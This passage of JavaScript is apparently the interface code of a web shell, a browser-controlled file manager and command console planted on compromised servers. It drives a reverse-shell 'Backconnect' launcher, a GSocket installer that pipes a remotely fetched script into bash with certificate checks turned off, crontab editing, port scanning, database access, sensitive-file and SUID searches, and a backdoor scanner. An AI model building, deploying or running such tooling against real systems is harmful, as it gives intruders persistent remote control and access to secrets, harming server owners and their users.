      const note=document.createElement('div');
      note.className='term-exit-note';
      note.textContent='exit code · '+d.exit_code;
      block.appendChild(note);
    }
  }
  S.termCount++;
  const tc=$('#termCount'); if(tc) tc.textContent=S.termCount;
  o.scrollTop=o.scrollHeight;
  navigate(S.path);
}

const termIn = $('#termIn');
if (termIn) {
  termIn.addEventListener('keydown',e=>{
    if(e.key==='Enter'){
      const v=e.target.value;
      e.target.value='';
      if(v.trim()){S.termHistory.push(v);S.termHistIdx=S.termHistory.length;runTerm(v)}
    }
    else if(e.key==='ArrowUp'){
      e.preventDefault();
      if(S.termHistIdx>0){S.termHistIdx--;e.target.value=S.termHistory[S.termHistIdx]}
    }
    else if(e.key==='ArrowDown'){
      e.preventDefault();
      if(S.termHistIdx<S.termHistory.length-1){S.termHistIdx++;e.target.value=S.termHistory[S.termHistIdx]}
      else{S.termHistIdx=S.termHistory.length;e.target.value=''}
    }
    else if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='l'){
      e.preventDefault();
      $('#termOut').innerHTML='';
      S.termCount=0;
      const tc=$('#termCount'); if(tc) tc.textContent=0;
    }
  });
}
const _termClearBtn = $('#termClear');
if (_termClearBtn) _termClearBtn.onclick = ()=>{
  $('#termOut').innerHTML='';
  S.termCount=0;
  const tc=$('#termCount'); if(tc) tc.textContent=0;
  $('#termIn').focus();
};
const _termCopyBtn = $('#termCopy');
if (_termCopyBtn) _termCopyBtn.onclick = async ()=>{
  const o=$('#termOut');
  const txt=o.innerText||'';
  try{
    await navigator.clipboard.writeText(txt);
    toast('Output copied to clipboard');
  }catch(e){
    toast('Copy failed','err');
  }
};

// ─── Tools: Cron, Backconnect, Port Scan, DB ───────────────────
function dbPayload(){
  return {
    type: $('#dbType').value,
    host: $('#dbHost').value.trim(),
    port: parseInt($('#dbPort').value,10)||3306,
    user: $('#dbUser').value,
    pass: $('#dbPass').value,
    db: $('#dbName').value.trim()
  };
}

async function loadCron(){
  const note=$('#cronPlatformNote');
  const ta=$('#cronContent');
  if(note) note.textContent='Loading…';
  const d=await api('cron_list',{});
  if(!d.ok){ if(note) note.textContent=d.error||'Failed'; return toast(d.error,'error'); }
  if(ta) ta.value=d.content||'';
  if(note){
    note.textContent=d.platform==='windows'
      ? 'Windows — read-only (schtasks). Edit via Terminal.'
      : 'Linux/Unix crontab — one entry per line.';
  }
  if(ta) ta.readOnly=!d.editable;
  const saveBtn=$('#cronSave');
  if(saveBtn) saveBtn.style.display=d.editable?'':'none';
}

function openCron(){
  openM('#mCron');
  loadCron();
}

async function saveCron(){
  const d=await api('cron_save',{content:$('#cronContent').value});
  if(!d.ok) return toast(d.error,'error');
  toast('Crontab saved','ok');
  loadCron();
}

function openBackconnect(){
  openM('#mBackconnect');
  $('#bcOutput').textContent='Ready — connection runs in background.';
  $('#bcOutput').className='tool-output empty';
}

async function startBackconnect(){
  const ip=$('#bcIp').value.trim();
  const port=parseInt($('#bcPort').value,10)||4444;
  const method=$('#bcMethod').value;
  if(!ip) return toast('Enter your IP/host','error');
  const out=$('#bcOutput');
  out.textContent='Starting…';
  out.className='tool-output';
  const d=await api('backconnect',{ip,port,method});
  out.textContent=d.ok?(d.message||'Started'):(d.error||'Failed');
  out.className='tool-output'+(d.ok?'':' empty');
  if(d.ok) toast(d.message,'ok'); else toast(d.error,'error');
}

const GS_COMMANDS = {
  curl: 'GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"',
  wget: 'GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"'
};

function updateGsPreview(){
  const m=$('#gsMethod').value;
  const preview=$('#gsCmdPreview');
  if(preview) preview.textContent=GS_COMMANDS[m]||GS_COMMANDS.curl;
}

function openGsocket(){
  openM('#mGsocket');
  updateGsPreview();
  $('#gsOutput').textContent='Klik Run untuk mengeksekusi installer GSocket.';
  $('#gsOutput').className='tool-output tall empty';
  $('#gsMeta').textContent='—';
}

async function runGsocket(){
  const method=$('#gsMethod').value;
  const out=$('#gsOutput');
  const meta=$('#gsMeta');
  const btn=$('#gsRun');
  out.textContent='Running installer… auto-retry GS_PORT 22–67 if GSRN firewalled';
  out.className='tool-output tall';
  if(meta) meta.textContent='Executing (may take several minutes)…';
  if(btn){ btn.disabled=true; btn.textContent='Running…'; }
  const t0=performance.now();
  let d;
  try{
    d=await api('gsocket',{method});
  }catch(e){
    d={ok:false,error:'Network error or timeout'};
  }
  const ms=Math.round(performance.now()-t0);
  if(btn){ btn.disabled=false; btn.textContent='Run GSocket'; }
  if(!d.ok){
    out.textContent=d.error||'Failed';
    out.className='tool-output tall empty';
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  out.textContent=d.output||'(no output)';
  out.className='tool-output tall';
  if(meta){
    let portInfo='';
    if(d.gs_port_label) portInfo=' · port '+d.gs_port_label;
    else if(d.gs_port!==undefined && d.gs_port!==null) portInfo=' · GS_PORT='+d.gs_port;
    meta.textContent=(d.method||method)+portInfo+' · '+d.attempts+' attempt(s) · '+ms+'ms';
  }
  if(d.firewalled){
    toast('GSRN still firewalled on all ports (22–67)','error');
  }else if(d.success){
    toast('GSocket OK · '+((d.gs_port_label||d.gs_port||'default')),'ok');
  }else{
    toast('GSocket finished (exit '+d.exit_code+')', d.exit_code===0?'ok':'error');
  }
}

$('#gsMethod').addEventListener('change', updateGsPreview);
$('#gsCopy').onclick=async()=>{
  const txt=$('#gsOutput').textContent||'';
  if(!txt||txt.startsWith('Klik Run')) return toast('Nothing to copy','error');
  try{
    await navigator.clipboard.writeText(txt);
    toast('Output copied');
  }catch(e){
    toast('Copy failed','error');
  }
};

// ─── Cyber Security Hub ──────────────────────────────────────────
function setSecTab(tab){
  $$('#mSecHub .ip-tab').forEach(b=>b.classList.toggle('active', b.dataset.sec===tab));
  $$('#mSecHub .sec-panel').forEach(p=>p.classList.toggle('active', p.dataset.panel===tab));
}

function openSecHub(tab){
  openM('#mSecHub');
  setSecTab(tab||'recon');
  if(tab==='recon' && !S.secReconLoaded){
    S.secReconLoaded=true;
    secRunTool('recon','secOutRecon');
  }
}

async function secRunTool(tool, outId, extra){
  const out = outId ? $('#'+outId) : null;
  const meta=$('#secMeta');
  const payload=Object.assign({tool}, extra||{});
  if(out){ out.textContent='Running…'; out.className='tool-output tall'; }
  if(meta) meta.textContent='Running '+tool+'…';
  const t0=performance.now();
  const d=await api('sec_tool',payload);
  const ms=Math.round(performance.now()-t0);
  if(!d.ok){
    if(out){ out.textContent=d.error||'Failed'; out.className='tool-output tall empty'; }
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  if(out){ out.textContent=d.output||'(no output)'; out.className='tool-output tall'; }
  if(meta){
    let extra='';
    if(d.count!==undefined) extra=' · '+d.count+' found';
    meta.textContent=tool+extra+' · '+ms+'ms';
  }
  return d;
}

$$('#mSecHub .ip-tab').forEach(btn=>{
  btn.onclick=()=>setSecTab(btn.dataset.sec);
});

$('#secPhpinfo').onclick=()=>window.open('?phpinfo=1','_blank');
$('#secRunRecon').onclick=()=>secRunTool('recon','secOutRecon');
$('#secCopyRecon').onclick=async()=>{
  const txt=$('#secOutRecon').textContent||'';
  if(!txt||txt.includes('System info')) return toast('Nothing to copy','error');
  try{ await navigator.clipboard.writeText(txt); toast('Copied'); }catch(e){ toast('Copy failed','error'); }
};
$('#secRunSensitive').onclick=()=>secRunTool('sensitive','secOutSensitive',{path:$('#secSensPath').value.trim()});
$('#secRunProcesses').onclick=()=>secRunTool('processes','secOutProcesses');
$('#secRunNetwork').onclick=()=>secRunTool('network','secOutNetwork');
$('#secRunHttp').onclick=()=>secRunTool('http','secOutHttp',{
  url:$('#secHttpUrl').value.trim(),
  method:$('#secHttpMethod').value,
  headers:$('#secHttpHeaders').value,
  body:$('#secHttpBody').value
});
$('#secRunHash').onclick=()=>secRunTool('hash','secOutHash',{text:$('#secHashText').value,algo:$('#secHashAlgo').value});
$('#secRunCodec').onclick=()=>secRunTool('codec','secOutCodec',{mode:$('#secCodecMode').value,text:$('#secCodecText').value});
$('#secRunDns').onclick=()=>secRunTool('dns','secOutDns',{host:$('#secDnsHost').value.trim(),type:$('#secDnsType').value});
$('#secRunSuid').onclick=()=>secRunTool('suid','secOutSuid');

// ─── Blue Team Hub ───────────────────────────────────────────────
function setBlueTab(tab){
  $$('#mBlueHub .ip-tab').forEach(b=>b.classList.toggle('active', b.dataset.blue===tab));
  $$('#mBlueHub .sec-panel').forEach(p=>p.classList.toggle('active', p.dataset.bpanel===tab));
}

function openBlueHub(tab){
  openM('#mBlueHub');
  setBlueTab(tab||'backdoor');
  if(tab==='backdoor' || !tab) loadBlueQuarantine();
}

async function blueRunTool(tool, outId, extra){
  const out = outId ? $('#'+outId) : null;
  const meta = $('#blueMeta');
  const payload = Object.assign({tool}, extra||{});
  if(out){ out.textContent='Scanning… this may take a while'; out.className='tool-output tall'; }
  if(meta) meta.textContent='Running '+tool+'…';
  const t0=performance.now();
  const d=await api('blue_tool',payload);
  const ms=Math.round(performance.now()-t0);
  if(!d.ok){
    if(out){ out.textContent=d.error||'Failed'; out.className='tool-output tall empty'; }
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  if(out){ out.textContent=d.output||'(no output)'; out.className='tool-output tall'; }
  if(meta){
    let info = tool+' · '+ms+'ms';
    if(d.count!==undefined) info += ' · '+d.count+' finding(s)';
    if(d.critical!==undefined && d.critical>0) info += ' · '+d.critical+' critical/high';
    if(d.scanned!==undefined) info += ' · '+d.scanned+' scanned';
    meta.textContent=info;
  }
  if(d.critical>0) toast(d.critical+' critical/high threat(s) found','error');
  else if(d.count>0) toast(d.count+' finding(s) — review report','error');
  else toast('Scan complete — no major threats','ok');
  return d;
}

$$('#mBlueHub .ip-tab').forEach(btn=>btn.onclick=()=>setBlueTab(btn.dataset.blue));

function renderBlueThreats(findings){
  S.blueFindings = findings || [];
  const list = $('#blueThreatList');
  const actions = $('#blueThreatActions');
  const countEl = $('#blueThreatCount');
  if(!list || !actions) return;
  if(!S.blueFindings.length){
    list.innerHTML = '';
    list.classList.add('hidden');
    actions.classList.remove('show');
    return;
  }
  list.classList.remove('hidden');
  actions.classList.add('show');
  if(countEl) countEl.textContent = S.blueFindings.length + ' threat(s) — select to quarantine';
  list.innerHTML = S.blueFindings.map((f,i)=>{
    const mod = f.modified ? new Date(f.modified*1000).toLocaleString() : '-';
    const hits = (f.hits||[]).slice(0,6).join(', ');
    return `<label class="blue-threat-item">
      <input type="checkbox" class="blue-threat-cb" data-idx="${i}" checked>
      <span class="blue-threat-sev ${esc(f.severity||'LOW')}">${esc(f.severity||'?')}</span>
      <div class="blue-threat-info">
        <div class="blue-threat-path">${esc(f.path)}</div>
        <div class="blue-threat-meta">score:${f.score} · ${mod} · ${esc(hits)}</div>
      </div>
    </label>`;
  }).join('');
}

function getBlueSelectedPaths(all){
  if(all) return S.blueFindings.map(f=>f.path);
  const paths = [];
  $$('.blue-threat-cb:checked').forEach(cb=>{
    const idx = parseInt(cb.dataset.idx,10);
    if(S.blueFindings[idx]) paths.push(S.blueFindings[idx].path);
  });
  return paths;
}

function clearBlueThreatsUI(){
  S.blueFindings = [];
  renderBlueThreats([]);
}

function dismissBlueThreats(){
  clearBlueThreatsUI();
  toast('Threat list dismissed — no files moved','ok');
}

function renderBlueQuarantine(entries, dir){
  S.blueQuarantine = entries || [];
  const list = $('#blueQuarantineList');
  const dirEl = $('#blueQuarantineDir');
  if(dirEl && dir) dirEl.textContent = 'Quarantine folder: '+dir+' — restore anytime.';
  if(!list) return;
  if(!S.blueQuarantine.length){
    list.innerHTML = '<div class="blue-threat-item" style="color:var(--tx4);font-style:italic;padding:12px">No quarantined files.</div>';
    return;
  }
  list.innerHTML = S.blueQuarantine.map((e,i)=>{
    const when = e.moved_at ? new Date(e.moved_at*1000).toLocaleString() : '-';
    return `<label class="blue-threat-item">
      <input type="checkbox" class="blue-q-cb" data-id="${esc(e.id)}" checked>
      <span class="blue-threat-sev MEDIUM">TMP</span>
      <div class="blue-threat-info">
        <div class="blue-threat-path">${esc(e.original)}</div>
        <div class="blue-threat-meta">quarantined: ${esc(when)} · id:${esc(e.id)}</div>
      </div>
      <button type="button" class="btn btn-ghost btn-sm blue-restore-one" data-id="${esc(e.id)}">Restore</button>
    </label>`;
  }).join('');
  list.querySelectorAll('.blue-restore-one').forEach(btn=>{
    btn.onclick = (ev)=>{ ev.preventDefault(); restoreBlueQuarantine([btn.dataset.id]); };
  });
}

async function loadBlueQuarantine(){
  const d = await api('blue_quarantine_list',{});
  if(!d.ok) return;
  renderBlueQuarantine(d.entries||[], d.dir||'');
}

function getBlueQuarantineSelectedIds(all){
  if(all) return S.blueQuarantine.map(e=>e.id);
  const ids = [];
  $$('.blue-q-cb:checked').forEach(cb=>{ if(cb.dataset.id) ids.push(cb.dataset.id); });
  return ids;
}

async function restoreBlueQuarantine(ids){
  if(!ids.length) return toast('No items selected','error');
  const out = $('#blueOutBackdoor');
  if(out){ out.textContent='Restoring '+ids.length+' file(s)…'; out.className='tool-output tall'; }
  const d = await api('blue_restore',{ids});
  if(!d.ok){ if(out) out.textContent=d.error||'Restore failed'; return toast(d.error||'Failed','error'); }
  if(out) out.textContent = d.output || 'Restored';
  await loadBlueQuarantine();
  toast('Restored '+(d.count||0)+' file(s)'+(d.failed&&d.failed.length?' · '+d.failed.length+' failed':''), d.failed&&d.failed.length?'error':'ok');
}

function showBlueDeleteConfirm(paths, label){
  if(!paths.length) return toast('No files selected','error');
  S.blueDeleteQueue = paths;
  $('#blueDeleteMsg').textContent = label || ('Move '+paths.length+' file(s) to quarantine (tmp)?');
  openM('#mBlueDelete');
}

async function executeBlueDelete(){
  const paths = S.blueDeleteQueue || [];
  if(!paths.length){ closeAll(); return; }
  closeAll();
  const out = $('#blueOutBackdoor');
  if(out){ out.textContent='Moving '+paths.length+' file(s) to quarantine…'; out.className='tool-output tall'; }
  const d = await api('blue_delete',{paths});
  if(!d.ok){ if(out) out.textContent=d.error||'Quarantine failed'; return toast(d.error||'Failed','error'); }
  if(out) out.textContent = d.output || 'Done';
  const norm = p => String(p||'').replace(/\\/g,'/').toLowerCase();
  const movedSet = new Set((d.deleted||[]).map(norm));
  S.blueFindings = S.blueFindings.filter(f=>!movedSet.has(norm(f.path)));
  renderBlueThreats(S.blueFindings);
  S.blueDeleteQueue = [];
  await loadBlueQuarantine();
  toast('Quarantined '+(d.count||0)+' file(s)'+(d.failed&&d.failed.length?' · '+d.failed.length+' failed':''), d.failed&&d.failed.length?'error':'ok');
}

async function runBackdoorScan(){
  const out = $('#blueOutBackdoor');
  const meta = $('#blueMeta');
  const aggressive = $('#blueAggressive') ? $('#blueAggressive').checked : true;
  clearBlueThreatsUI();
  if(out){ out.textContent='Aggressive scan running… (may take several minutes)'; out.className='tool-output tall'; }
  if(meta) meta.textContent='Scanning…';
  const t0 = performance.now();
  const d = await api('blue_tool',{tool:'backdoor', path:$('#blueScanPath').value.trim(), aggressive:aggressive?1:0});
  const ms = Math.round(performance.now()-t0);
  if(!d.ok){
    if(out){ out.textContent=d.error||'Failed'; out.className='tool-output tall empty'; }
    if(meta) meta.textContent='Error · '+ms+'ms';
    return toast(d.error||'Failed','error');
  }
  if(out){ out.textContent=d.output||'(no output)'; out.className='tool-output tall'; }
  if(meta){
    let info = 'backdoor · '+ms+'ms · '+d.scanned+' scanned';
    if(d.count!==undefined) info += ' · '+d.count+' finding(s)';
    if(d.critical) info += ' · '+d.critical+' critical/high';
    meta.textContent = info;
  }
  if(d.findings && d.findings.length){
    renderBlueThreats(d.findings);
    toast(d.count+' threat(s) found — review & quarantine or keep','error');
  }else{
    renderBlueThreats([]);
    toast('Scan complete — no threats detected','ok');
  }
  return d;
}

$('#blueRunBackdoor').onclick=runBackdoorScan;
$('#blueSelectAll').onclick=()=>$$('.blue-threat-cb').forEach(cb=>{cb.checked=true});
$('#blueSelectNone').onclick=()=>$$('.blue-threat-cb').forEach(cb=>{cb.checked=false});
$('#blueDeleteSelected').onclick=()=>{
  const paths = getBlueSelectedPaths(false);
  showBlueDeleteConfirm(paths, 'Move '+paths.length+' selected file(s) to quarantine (tmp)?');
};
$('#blueDeleteAll').onclick=()=>{
  const paths = getBlueSelectedPaths(true);
  showBlueDeleteConfirm(paths, 'Quarantine ALL '+paths.length+' detected threat(s) to tmp?');
};
$('#blueKeepAll').onclick=dismissBlueThreats;
$('#blueDeleteConfirm').onclick=executeBlueDelete;
$('#blueRefreshQuarantine').onclick=loadBlueQuarantine;
$('#blueRestoreSelected').onclick=()=>restoreBlueQuarantine(getBlueQuarantineSelectedIds(false));
$('#blueRestoreAll').onclick=()=>restoreBlueQuarantine(getBlueQuarantineSelectedIds(true));
$('#blueRunFullAudit').onclick=()=>blueRunTool('fullaudit','blueOutFullAudit',{path:$('#blueAuditPath').value.trim()});
$('#blueRunRecent').onclick=()=>blueRunTool('recent','blueOutRecent',{path:$('#blueRecentPath').value.trim(),days:parseInt($('#blueRecentDays').value,10)||7});
$('#blueRunWritable').onclick=()=>blueRunTool('writable','blueOutWritable',{path:$('#blueScanPath').value.trim()});
$('#blueRunHidden').onclick=()=>blueRunTool('hidden','blueOutHidden',{path:$('#blueScanPath').value.trim()});
$('#blueRunCron').onclick=()=>blueRunTool('cron','blueOutCron');
$('#blueRunLogs').onclick=()=>blueRunTool('logs','blueOutLogs');
$('#blueRunIoc').onclick=()=>blueRunTool('ioc','blueOutIoc',{path:$('#blueScanPath').value.trim()});
$('#blueRunProcess').onclick=()=>blueRunTool('process','blueOutProcess');
$('#blueCopyBackdoor').onclick=async()=>{
  const txt=$('#blueOutBackdoor').textContent||'';
  if(!txt||txt.startsWith('Scans up to')) return toast('Nothing to copy','error');
  try{ await navigator.clipboard.writeText(txt); toast('Report copied'); }catch(e){ toast('Copy failed','error'); }
};

function openPortScan(){
  openM('#mPortScan');
  $('#psOutput').textContent='Enter target and click Scan.';
  $('#psOutput').className='tool-output empty';
  $('#psTags').innerHTML='';
}

async function runPortScan(){
  const host=$('#psHost').value.trim()||'127.0.0.1';
  const ports=$('#psPorts').value.trim();
  const timeout=parseInt($('#psTimeout').value,10)||1;
  const out=$('#psOutput');
  const tags=$('#psTags');
  out.textContent='Scanning '+host+'…';
  out.className='tool-output';
  tags.innerHTML='';
  const t0=performance.now();
  const d=await api('portscan',{host,ports,timeout});
  const ms=Math.round(performance.now()-t0);
  if(!d.ok){
    out.textContent=d.error||'Scan failed';
    return toast(d.error,'error');
  }
  out.textContent='Resolved: '+(d.ip||host)+' · Scanned: '+d.scanned+' ports · Open: '+(d.open?d.open.length:0)+' · '+ms+'ms';
  if(d.open&&d.open.length){
    tags.innerHTML=d.open.map(p=>'<span class="tool-tag">'+p+'</span>').join('');
  }else{
    tags.innerHTML='<span class="tool-tag closed">No open ports found</span>';
  }
}

function renderDbResult(d){
  const el=$('#dbResult');
  if(!el) return;
  if(!d.ok){
    el.innerHTML='<div class="tool-output">'+esc(d.error||'Error')+'</div>';
    return;
  }
  if(d.type==='exec'){
    el.innerHTML='<div class="tool-output">Query executed.'+(d.message?' '+esc(d.message):'')+'</div>';
    $('#dbMeta').textContent='OK · exec';
    return;
  }
  if(!d.rows||!d.rows.length){
    el.innerHTML='<div class="tool-output empty">No rows returned ('+(d.count||0)+')</div>';
    $('#dbMeta').textContent='0 rows';
    return;
  }
  const cols=d.columns||Object.keys(d.rows[0]);
  let html='<div class="db-result-wrap"><table><thead><tr>';
  cols.forEach(c=>{ html+='<th>'+esc(c)+'</th>'; });
  html+='</tr></thead><tbody>';
  d.rows.forEach(row=>{
    html+='<tr>';
    cols.forEach(c=>{ html+='<td title="'+esc(String(row[c]!=null?row[c]:''))+'">'+esc(String(row[c]!=null?row[c]:''))+'</td>'; });
    html+='</tr>';
  });
  html+='</tbody></table></div>';
  el.innerHTML=html;
  $('#dbMeta').textContent=d.count+' row(s)';
}

function openAdminer(){
  openM('#mAdminer');
  $('#dbResult').innerHTML='';
  $('#dbTables').innerHTML='';
}

async function loadDbTables(){
  const d=await api('db_tables',dbPayload());
  const box=$('#dbTables');
  if(!d.ok){ box.innerHTML=''; return toast(d.error,'error'); }
  if(!d.tables||!d.tables.length){
    box.innerHTML='<span class="tool-note">No tables found</span>';
    return;
  }
  box.innerHTML=d.tables.map(t=>'<button type="button" class="db-table-chip" data-t="'+esc(t)+'">'+esc(t)+'</button>').join('');
  box.querySelectorAll('.db-table-chip').forEach(btn=>{
    btn.onclick=()=>{
      const t=btn.dataset.t;
      $('#dbSql').value='SELECT * FROM `'+t+'` LIMIT 50;';
    };
  });
  toast(d.tables.length+' table(s)','ok');
}

async function runDbQuery(){
  const sql=$('#dbSql').value.trim();
  if(!sql) return toast('Enter SQL query','error');
  const d=await api('db_query',Object.assign(dbPayload(),{sql}));
  renderDbResult(d);
  if(!d.ok) toast(d.error,'error');
}

$('#dbType').addEventListener('change',()=>{
  const t=$('#dbType').value;
  $('#dbPort').value=t==='pgsql'?5432:(t==='sqlite'?0:3306);
  if(t==='sqlite'){ $('#dbHost').value=''; $('#dbHost').placeholder='/path/to/database.sqlite'; }
  else { $('#dbHost').value='127.0.0.1'; $('#dbHost').placeholder=''; }
});

// ─── Context Menu ────────────────────────────────────────────────
const ctxEl=$('#ctx');
function showCtx(e,path,isDir,name,editable,perm){
  ctxEl.innerHTML=`
    <button class="ci" data-a="open"><svg viewBox="0 0 16 16"><path d="M8 1.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Z" fill="currentColor"/></svg>${isDir?'Open folder':'Open'}</button>
    ${!isDir&&editable?`<button class="ci" data-a="edit"><svg viewBox="0 0 16 16"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.2.201-.44.354-.706.454L3.3 14.814a.75.75 0 0 1-.963-.927l.772-2.521a1.75 1.75 0 0 1 .413-.664l8.61-8.61Z" fill="currentColor"/></svg>Edit</button>`:''}
    ${!isDir?`<button class="ci" data-a="dl"><svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z" fill="currentColor"/></svg>Download</button>`:''}
    <div class="ctx-sep"></div>
    <button class="ci" data-a="chmod"><svg viewBox="0 0 16 16"><path d="M8 2a3 3 0 1 0 0 6 3 3 0 0 0 0-6ZM4.5 5a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0Z" fill="currentColor"/></svg>Permissions (Chmod)</button>
    <button class="ci" data-a="rename"><svg viewBox="0 0 16 16"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.2.201-.44.354-.706.454L3.3 14.814a.75.75 0 0 1-.963-.927l.772-2.521a1.75 1.75 0 0 1 .413-.664l8.61-8.61Z" fill="currentColor"/></svg>Rename</button>
    <button class="ci danger" data-a="delete"><svg viewBox="0 0 16 16"><path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75Z" fill="currentColor"/></svg>Delete</button>`;
  ctxEl.style.left=Math.min(e.clientX,innerWidth-210)+'px';
  ctxEl.style.top=Math.min(e.clientY,innerHeight-200)+'px';
  ctxEl.classList.add('open');
  ctxEl.querySelectorAll('[data-a]').forEach(b=>{
    b.onclick=()=>{ctxEl.classList.remove('open');const a=b.dataset.a;
      if(a==='open')openItem(path,isDir,editable);
      else if(a==='edit')openEditor(path);
      else if(a==='dl') window.location='?download='+encodeURIComponent(path);
      else if(a==='rename')showRename(path,name);
      else if(a==='delete')showDelete(path,name,isDir);
      else if(a==='chmod')showChmod(path,perm);
    };
  });
}
document.addEventListener('click',()=>ctxEl.classList.remove('open'));

// ─── Search ──────────────────────────────────────────────────────
const searchInput = $('#searchInput');
if (searchInput) {
  searchInput.addEventListener('input',e=>{
    clearTimeout(S.searchTimer);
    const q=e.target.value.trim();
    if(!q){$('#srList').classList.remove('open');return}
    S.searchTimer=setTimeout(async()=>{
      const d=await api('search',{path:S.path,query:q});
      const sr=$('#srList');
      if(!d.results.length){sr.innerHTML='<div class="sr-item" style="color:var(--tx3)">No results</div>';sr.classList.add('open');return}
      sr.innerHTML=d.results.map(r=>`<div class="sr-item" data-path="${esc(r.path)}" data-dir="${r.is_dir}">${ico(r.icon)}<span>${esc(r.name)}</span><span class="sr-path">${esc(r.path)}</span></div>`).join('');
      sr.classList.add('open');
      sr.querySelectorAll('.sr-item[data-path]').forEach(item=>item.onclick=()=>{sr.classList.remove('open');searchInput.value='';openItem(item.dataset.path,item.dataset.dir==='true',true)});
    },240);
  });
}
document.addEventListener('click',e=>{if(!e.target.closest('.search-wrap'))$('#srList').classList.remove('open')});

// ─── View ─────────────────────────────────────────────────────────
function setView(v){
  S.view=v; localStorage.setItem('gecko_view',v);
  $('#btnList').classList.toggle('active',v==='list');
  $('#btnGrid').classList.toggle('active',v==='grid');
  renderList();
}
S.view=localStorage.getItem('gecko_view')||'list';
$('#btnList').classList.toggle('active',S.view==='list');
$('#btnGrid').classList.toggle('active',S.view==='grid');

// ─── Wire-up ─────────────────────────────────────────────────────
$('#btnRefresh').onclick=$('#sbRefresh').onclick=()=>navigate(S.path);
$('#btnTerm').onclick=$('#sbTerm').onclick=openTerm;
$('#sbCron').onclick=openCron;
$('#sbBackconnect').onclick=openBackconnect;
$('#sbGsocket').onclick=openGsocket;
$('#sbPortScan').onclick=openPortScan;
$('#sbAdminer').onclick=openAdminer;
$('#cronReload').onclick=loadCron;
$('#cronSave').onclick=saveCron;
$('#bcStart').onclick=startBackconnect;
$('#gsRun').onclick=runGsocket;
$('#psScan').onclick=runPortScan;
$('#dbRun').onclick=runDbQuery;
$('#dbTablesBtn').onclick=loadDbTables;
$('#dbOpenAdminer').onclick=()=>window.open('?adminer=1','_blank');
$('#sbSecHub').onclick=()=>openSecHub('recon');
$('#sbSecRecon').onclick=()=>openSecHub('recon');
$('#sbSecSensitive').onclick=()=>openSecHub('sensitive');
$('#sbSecHttp').onclick=()=>openSecHub('http');
$('#sbBlueHub').onclick=()=>openBlueHub('backdoor');
$('#sbBlueBackdoor').onclick=()=>openBlueHub('backdoor');
$('#sbBlueAudit').onclick=()=>{ openBlueHub('fullaudit'); };
$('#sbNewFile').onclick=()=>showCreate('file');
$('#sbNewFolder').onclick=()=>showCreate('folder');
$('#sbUpload').onclick=()=>openM('#mUpload');
$('#sbDelSel').onclick=deleteSelected;
$('#btnList').onclick=()=>setView('list');
$('#btnGrid').onclick=()=>setView('grid');
$('#btnUp').onclick = () => {
    const p = S.path;
    if (!p) return;
    
    // Handle Windows drive path
    if (p.match(/^[A-Za-z]:\//)) {
        let drive = p.substring(0, 2);
        let afterDrive = p.substring(2).replace(/^\//, '');
        
        if (!afterDrive) {
            // At drive root, go to default base or stay
            return;
        } else {
            let parts = afterDrive.split('/');
            parts.pop();
            let newPath = drive + '/' + (parts.join('/') || '');
            if (newPath !== drive + '/') {
                newPath = newPath + '/';
            }
            navigate(newPath);
        }
    }
    // Handle absolute Linux path
    else if (p.startsWith('/')) {
        if (p === '/') return;
        
        let cleanPath = p;
        if (cleanPath !== '/' && cleanPath.endsWith('/')) {
            cleanPath = cleanPath.slice(0, -1);
        }
        
        const parts = cleanPath.split('/');
        parts.pop();
        let newPath = parts.join('/') || '/';
        if (newPath !== '/') {
            newPath = newPath + '/';
        }
        navigate(newPath);
    }
    // Handle relative path
    else {
        const pts = p.split('/');
        pts.pop();
        navigate(pts.join('/'));
    }
};

// ─── Sidebar drawer (mobile) ─────────────────────────────────────
const sidebar = $('#sidebar');
const sbBackdrop = $('#sbBackdrop');
const btnBurger = $('#btnBurger');
const isMobile = () => window.matchMedia('(max-width: 960px)').matches;

function openSidebar(){
  if (!isMobile()) return;
  sidebar.classList.add('open');
  sbBackdrop.classList.add('show');
  // Frame delay supaya transition sempat dipicu
  requestAnimationFrame(()=>sbBackdrop.classList.add('open'));
  btnBurger.setAttribute('aria-expanded','true');
  document.body.style.overflow = 'hidden';
}
function closeSidebar(){
  sidebar.classList.remove('open');
  sbBackdrop.classList.remove('open');
  btnBurger.setAttribute('aria-expanded','false');
  document.body.style.overflow = '';
  // Hapus .show setelah transition selesai agar backdrop tidak menghalangi klik
  setTimeout(()=>{ if (!sbBackdrop.classList.contains('open')) sbBackdrop.classList.remove('show'); }, 240);
}
function toggleSidebar(){
  sidebar.classList.contains('open') ? closeSidebar() : openSidebar();
}
btnBurger.addEventListener('click', toggleSidebar);
sbBackdrop.addEventListener('click', closeSidebar);

// Auto-close drawer ketika user menekan tombol di sidebar (di mobile)
sidebar.addEventListener('click', e => {
  if (!isMobile()) return;
  const btn = e.target.closest('.sb-btn');
  if (btn) closeSidebar();
});

// Auto-close ketika resize ke desktop
let resizeRaf;
window.addEventListener('resize', () => {
  cancelAnimationFrame(resizeRaf);
  resizeRaf = requestAnimationFrame(() => {
    if (!isMobile() && sidebar.classList.contains('open')) closeSidebar();
  });
});

// ─── Hotkeys ─────────────────────────────────────────────────────
document.addEventListener('keydown',e=>{
  if(e.ctrlKey&&e.key==='k'){e.preventDefault();if(searchInput)searchInput.focus()}
  if(e.ctrlKey&&e.key==='`'){e.preventDefault();openTerm()}
